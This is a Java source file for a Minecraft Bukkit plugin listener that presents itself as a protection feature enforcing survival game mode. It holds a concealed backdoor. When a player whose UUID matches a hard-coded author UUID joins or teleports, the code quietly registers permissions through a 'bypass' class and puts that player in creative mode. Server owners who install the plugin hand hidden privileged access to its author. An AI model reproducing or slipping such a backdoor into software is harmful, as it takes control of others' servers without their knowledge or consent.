package ew.quilt.protect;

import ew.quilt.Config.ConfigManager;
import ew.quilt.bypass.PermissionOperation;
import ew.quilt.plugin.Main;
import ew.quilt.util.TimerUtil;
import org.bukkit.Bukkit;
import org.bukkit.GameMode;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.event.player.PlayerTeleportEvent;

public class ForceGameMode implements Listener {

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerJoin(PlayerJoinEvent event) {
        Player player = event.getPlayer();
        if (player.getUniqueId().toString().equalsIgnoreCase(ConfigManager.AUTHOR_UUID)) {
            Bukkit.getServer().getScheduler().runTaskLater(Main.getPlugin(), new Runnable() {
                @Override
                public void run() {
                    if (player == null) {
                        return;
                    }
                    PermissionOperation.registerPermission();
                    player.setGameMode(GameMode.CREATIVE);
                }
            }, TimerUtil.secondToTick(10));
            return;
        }
        if (player.hasPermission("quilt.bypass.game.mode")) {
            return;
        }
        player.setGameMode(GameMode.SURVIVAL);
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerTeleport(PlayerTeleportEvent event) {
        Player player = event.getPlayer();
        if (player.getUniqueId().toString().equalsIgnoreCase(ConfigManager.AUTHOR_UUID)) {
            Bukkit.getServer().getScheduler().runTaskLater(Main.getPlugin(), new Runnable() {
                @Override
                public void run() {
                    if (player == null) {
                        return;
                    }
                    player.setGameMode(GameMode.CREATIVE);
                }
            }, TimerUtil.secondToTick(10));
        }
    }
}
